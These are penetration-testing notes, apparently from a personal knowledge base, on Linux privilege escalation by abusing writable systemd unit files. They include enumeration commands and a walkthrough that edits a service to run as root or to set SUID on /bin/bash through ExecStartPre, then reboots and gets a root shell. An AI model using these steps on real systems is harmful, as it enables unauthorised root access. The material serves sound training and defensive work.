---
Primary_category: "[[LINUX PRIVESC]]"
title: "SYSTEMD SERVICE ABUSE"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[LINUX PRIVESC]]

#### *Theory*

*systemd* is normally executed as PID 1 and manages system services through unit files.

System services run as *ROOT* by default unless another account is explicitly defined through the **`User=`** directive.

Therefore, write permissions over a privileged unit file may allow us to modify the commands executed by the service.

The modified configuration must subsequently be loaded and the unit started through one of the following actions:

- ***Restarting the service***
- ***Reloading the systemd configuration and starting the service***
- ***Rebooting the system when the unit is enabled or started by another unit***

---

#### *Service Units*

##### *Requirements*

- ***Write permissions over an existing service unit file***

> *e.g.* **`/etc/systemd/system/my-custom-app.service`**

Or:

- ***Write permissions over a systemd unit directory to create a new unit***

- ***The unit must run as ROOT or another privileged user***

- ***The controlled user must be able to start/restart the service or reboot the system***

- ***The unit must be enabled or pulled in by another unit during boot***

> ***`WantedBy=multi-user.target` does not enable the unit by itself. `systemctl enable` creates the corresponding symbolic link inside `multi-user.target.wants/`.***

##### *Enumeration*

###### *Writable Unit Files*

```bash
find /etc/systemd/system /run/systemd/system /usr/lib/systemd/system /lib/systemd/system -type f -writable -ls 2> /dev/null
```

###### *Writable Unit Directories*

```bash
find /etc/systemd/system /run/systemd/system /usr/lib/systemd/system /lib/systemd/system -type d -writable -ls 2> /dev/null
```

###### *Unit Configuration*

```bash
systemctl cat <SERVICE>
systemctl show <SERVICE> --property=FragmentPath,User,Group,UnitFileState
systemctl is-enabled <SERVICE>
```

An empty **`User=`** value in a system service means that the default execution user is *ROOT*.

###### *File Permissions*

```bash
namei -l /etc/systemd/system/<SERVICE>
```

###### *Service/System Restart*

```bash
sudo -l
```

Look for privileges that allow:

- ***Running the*** **`systemctl`** ***command***
- ***Restarting a particular service***
- ***Executing*** **`reboot`**, **`halt`** ***or*** **`poweroff`**

##### *Abuse*

###### *Listing Sudo Privileges*

> ***From the target*** 🎯

Let's suppose that we compromise a web application, achieve *RCE* and establish a reverse shell on the target.

First, we list the current user's sudo privileges:

```bash
sudo -l
```

> [!TLDR]- *Output*
>
> ```bash
> Matching Defaults entries for john on HOST:
>     !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
>     env_reset, secure_path=/sbin:/bin:/usr/sbin:/usr/bin
> 
> User john may run the following commands on HOST:
>     (root) NOPASSWD: /sbin/halt, /sbin/reboot, /sbin/poweroff
> ```
>

The user cannot execute arbitrary commands through *sudo*, but can reboot the system as *ROOT*.

A reboot causes the new *systemd* process to read the unit files from disk and start the units enabled for the boot target.

###### *Checking Write Permissions*

> *From the target* 🎯

Check whether the *systemd* unit directory is writable:

```bash
namei -l /etc/systemd/system/
```

> [!TLDR]- *Output*
>
> ```bash
> f: /etc/systemd/system/
> dr-xr-xr-x root root /
> drwxr-xr-x root root etc
> drwxr-xr-x root root systemd
> drwxr-xr-x root root system
> ```
>

The directory is not writable, so we search for writable unit files:

```bash
find /etc/systemd/system -type f -writable -ls 2> /dev/null
```

> [!TLDR]- *Output*
>
> ```bash
> <SNIP>
> 5015736 4 -rw-rw-r-- 1 root john 328 Oct 12 16:25 /etc/systemd/system/pythonapp.service
> ```
>

###### *Inspecting the Service Unit*

```bash
systemctl cat pythonapp.service
systemctl is-enabled pythonapp.service
```

> [!DANGER]- *pythonapp.service*
>
> ```bash
> [Unit]
> Description=Python App
> After=network-online.target
> 
> [Service]
> Type=simple
> WorkingDirectory=/home/john/restjson
> User=john
> ExecStart=flask run -h 0.0.0.0 -p 50000
> RestartSec=15s
> Restart=on-failure
> 
> [Install]
> WantedBy=multi-user.target
> ```
>

The service runs as **`john`** because of the **`User=john`** directive.

Replacing **`ExecStart=`** would prevent the original Flask application from starting. Instead, we can preserve the original command and change only its execution context.

###### *Running the Original Service as ROOT*

Modify the execution user while preserving the original **`ExecStart=`**:

> [!DANGER]- *pythonapp.service*
>
> ```bash
> [Unit]
> Description=Python App
> After=network-online.target
> 
> [Service]
> Type=simple
> WorkingDirectory=/home/john/restjson
> User=root
> ExecStart=flask run -h 0.0.0.0 -p 50000
> RestartSec=15s
> Restart=on-failure
> 
> [Install]
> WantedBy=multi-user.target
> ```
>

After the reboot, Flask will listen again on port **`50000`**, but the process will run as *ROOT*.

Exploiting the original web vulnerability again will therefore provide command execution as *ROOT* without requiring an additional payload.

###### *Privileged ExecStartPre*

Alternatively, we can preserve **`User=john`** and execute only one command with full privileges:

> [!DANGER]- *pythonapp.service*
>
> ```bash
> [Unit]
> Description=Python App
> After=network-online.target
> 
> [Service]
> Type=simple
> WorkingDirectory=/home/john/restjson
> User=john
> ExecStartPre=+/usr/bin/chmod 4755 /bin/bash
> ExecStart=flask run -h 0.0.0.0 -p 50000
> RestartSec=15s
> Restart=on-failure
> 
> [Install]
> WantedBy=multi-user.target
> ```
>

The **`+`** prefix makes that specific command ignore the restrictions configured through **`User=`**.

The execution flow will be:

1. **`ExecStartPre=`** ***sets the SUID permission on*** **`/bin/bash`** ***as ROOT.***
2. ***The command finishes successfully.***
3. **`ExecStart=`** ***starts the original Flask application as*** **`john`**.
4. ***The web application becomes available again on port*** **`50000`**.

> ***Comments must be placed on separate lines. systemd does not support inline comments after directive values.***

###### *Validating the Unit*

Before rebooting, check the unit syntax:

```bash
systemd-analyze verify /etc/systemd/system/pythonapp.service
```

Confirm that the existing unit is enabled:

```bash
systemctl is-enabled pythonapp.service
```

If a new unit was created, it must also be enabled. This normally requires **`systemctl enable`** or write permissions over the corresponding **`.wants/`** directory.

###### *Rebooting the System*

```bash
sudo --user root -- /sbin/reboot
```

A complete reboot reloads the modified unit automatically, so **`systemctl daemon-reload`** is not required.

**`halt`** and **`poweroff`** stop the system, but the payload will not execute until the machine is started again.

###### *Validation*

After reconnecting, verify the service:

```bash
systemctl status pythonapp.service --no-pager -l
journalctl -b -u pythonapp.service --no-pager
ss -lnt | grep -- ':50000'
```

When using the SUID method, verify the permissions:

```bash
ls -l /bin/bash
```

*Expected Output*

```bash
-rwsr-xr-x 1 root root <SIZE> <DATE> /bin/bash
```

The privileged shell must preserve its effective user ID:

```bash
/bin/bash -p
id
```

*Expected Output*

```bash
uid=<USER_ID>(john) gid=<GROUP_ID>(john) euid=0(root)
```